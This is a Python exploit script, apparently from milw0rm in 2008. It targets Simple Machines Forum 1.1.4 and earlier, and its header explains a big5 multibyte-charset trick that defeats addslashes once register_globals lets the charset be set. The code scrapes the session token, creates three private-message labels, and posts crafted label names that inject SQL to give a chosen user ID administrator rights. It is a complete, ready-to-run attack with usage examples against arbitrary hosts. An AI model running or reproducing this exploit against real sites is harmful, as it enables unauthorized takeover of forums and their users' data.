#!/usr/bin/python
"""
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                     This was a priv8 Exploit                                    #
#=================================================================================================#
#  	           		    Simple Machines Forum <= 1.1.4                                #
#    		                      Sql Injection Vulnerability    			          #
#                                    Priviledge Escalation Exploit              		  #
#====================================#===========#====================================#===========#
# Server Configuration Requirements  #           # Some Information                   #           #
#====================================#		 #====================================#           #
#                                                #                                                #
# register_globals = 1                           #  Vendor:   www.simplemachines.org              #
#                                                #  Author:   The:Paradox                         #
#================================================#  Severity: N/A		                  #
# 						 #						  #
# You may find exploits updates and more 	 #						  #
# explanations on =>				 #  Proud To Be Italian.                          #
# 	    	http://paradox.altervista.org 	 #  	                 			  #
#                                                #                                                #
#====================================#===========#================================================#
# Board Description		     #								  #
#====================================#								  #
#												  #
# Simple Machines Forum - SMF in short - is a free, professional grade software package that 	  #
# allows you to set up your own online community within minutes.				  #
# Its powerful custom made template engine puts you in full control of the lay-out of your	  #
# message board and with our unique SSI - or Server Side Includes - function you can let your     #
# forum and your website interact with each other.						  #
# SMF is written in the popular language PHP and uses a MySQL database. It is designed to provide #
# you with all the features you need from a bulletin board while having an absolute minimal	  #
# impact on the resources of the server. 							  #
# SMF is the next generation of forum software - and best of all it is and will always 		  #
# remain completely free! 									  #
#												  #
#====================================#============================================================#
# Proof Of Concept / Bug Explanation #                                                            #
#====================================#                                                            #
# This is a quite old exploit and it is inapplicable on 1.1.5 version and on last 2.0 pre-release #
# (that's why I decided to public it). First, let's have a little poc.				  #
#=================================================================================================#

[Load.php]

148.	if (isset($db_character_set) && preg_match('~^\w+$~', $db_character_set) === 1)
149.		db_query("
150.			SET NAMES $db_character_set", __FILE__, __LINE__);


#=================================================================================================#
# In Load.php if $db_character_set is set Smf will execute a Set Names Sql Query.      		  #
# Directly from dev.mysql.com let's see what it means.						  #
#												  #
# "SET NAMES indicates what character set the client will use to send SQL statements to the       #
# the server. Thus, SET NAMES 'cp1251' tells the server future incoming messages from this client #
# are in character set cp1251."									  #
#												  #
# Ok, now let's see what $db_character_set is.							  #
# $db_character_set is a "Settings.php variable" written only if a "Non-Default tick"	          #
# is checked during the installation process.							  #
# The real vulnerability is when the "Non-Default tick" is left unchecked, Smf doesn't write      #
# it in "Settings.php" and no value is assigned to it: it's possible to set it 			  #
# via register_globals.										  #
# 												  #
# Now the cool poc section =D 									  #
# Surely you saw that preg_match avoids any injection of non-alphanumerical chars in the query    #
# at line 150 in Load.php 	  								  #
# So, how is possible to take advantage of that?						  #
# To understand this vulnerability you have to comprehend some character set presents multibyte	  #
# characters and they may obiate addslashes() function.		  	  			  #
# Addslashes simply adds a backslash (0x5c) before single quote ('), double quote ("), 		  #
# backslash (\) and NUL (the NULL byte), without checking if the added blackslash creates 	  #
# another char.											  #
# No, i'm not going mad :P Here is an example:							  #
#												  #
# 	   				    Bytes in Input 					  #
#	      				        0xa327						  #
#												  #
#      				       Addslashes(Bytes in Input)				  #
#    	     				       0xa35c27						  #
# 												  #
# In big5, but also in other multibyte charsets, 0xa35c is a valid char: 0x27 (') is left alone.  #
# Therefore a lot of smf's queries are vulnerable if $db_character_set is settable.		  #
# In this exploit i will inject sql code in Update syntax, increasing user's privledges.	  #
#=================================================================================================#
# Exploit tested on 1.1.3 and 1.1.4 Smf's versions. 						  #
#=================================================================================================#
# Use this exploit at your own risk. You are responsible for your own deeds.                      #
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#
"""
from sys import argv, exit
from httplib import HTTPConnection
from urllib import urlencode, unquote
from time import sleep
print """
#=================================================================#
#  	           Simple Machines Forum <= 1.1.4                 #
#                    Sql Injection Vulnerability                  #
#                   Priviledge Escalation Exploit                 #
#                                                                 #
#               ######################################            #
#               #  Let's get administrator rights!!! #            #
#               ######################################            #
#                                                                 #
#                     Discovered By The:Paradox                   #
#                                                                 #
# Usage:                                                          #
#  ./Exploit [Target] [Path] [PHPSessID] [Userid]                 #
#                                                                 #
# Example:                                                        #
#  ./Exploit 127.0.0.1 /SMF/ a574bfe34d95074dea69c00e38851722 9   #
#  ./Exploit www.host.com / 11efb3b6031bc79a8dd7526750c42119 36   #
#=================================================================#
"""

if len(argv)<=4: exit()


sn = "PHPSESSID" # Session cookie name. You may have to change this.
port = 80

target = argv[1]
path = argv[2]
sv = argv[3]
uid = argv[4]


class killsmf:

	def __init__(self):

		print "[.] Exploit Starts."

		self.GetSesc()
		self.CreateLabels()
		self.Inject()

		print "[+] All done.\n Now user with ID_MEMBER " + uid + " should have administrator rights. \n -= Paradox Got This One =-"

	def GetSesc(self):

		print "[+] Trying to read Sesc"

		for i in range (0,2):
				conn = HTTPConnection(target,port)
				conn.request("GET", path + "index.php?action=pm;sa=manlabels;", {}, {"Accept": "text/plain","Cookie": sn + "=" + sv + ";"})
				rsp = conn.getresponse()
				r = rsp.read()

		if rsp.status == 404:
				exit ("[-] Error 404. Not Found")
		elif r.find('<input type="hidden" name="sc" value="') != -1 and r.find('" />') != -1 :
				self.sesc = r.split('<input type="hidden" name="sc" value="')[1].split('" />')[0]
				if len(self.sesc) != 32: exit ("[-] Invalid Sesc")
				print "[+] Sesc has been successfully read ==> "+self.sesc
		else:
				exit ("[-] Unable to find Sesc")

	def CreateLabels(self):
		print "[+] Creating three labels..."
		for i in range (0,3):
				conn = HTTPConnection(target,port)
				conn.request("POST", path + "index.php?action=pm;sa=manlabels;sesc="+self.sesc, urlencode({"label" : i, "add" : "Add+New+Label"}), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded","Referer": "http://" + target + path + "/index.php?action=pm;sa=manlabels", "Cookie": sn + "=" + sv + ";"})
				sleep(0.35)
	def Inject(self):
		print "[+] Sql code is going to be injected."
		conn = HTTPConnection(target,port)
		conn.request("POST", path + "index.php?debug;action=pm;sa=manlabels;sesc="+self.sesc, urlencode({"label_name[0]" : "o rly" + unquote("%a3%27"),"label_name[1]" : "ID_GROUP=1 WHERE/*", "label_name[2]" : "*/ID_MEMBER=" + uid + "/*", "save" : "Save", "sc" : self.sesc, "db_character_set": "big5"}), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded","Referer": "http://" + target + path + "/index.php?action=pm;sa=manlabels", "Cookie": sn + "=" + sv + ";"})

killsmf()

# milw0rm.com [2008-06-15]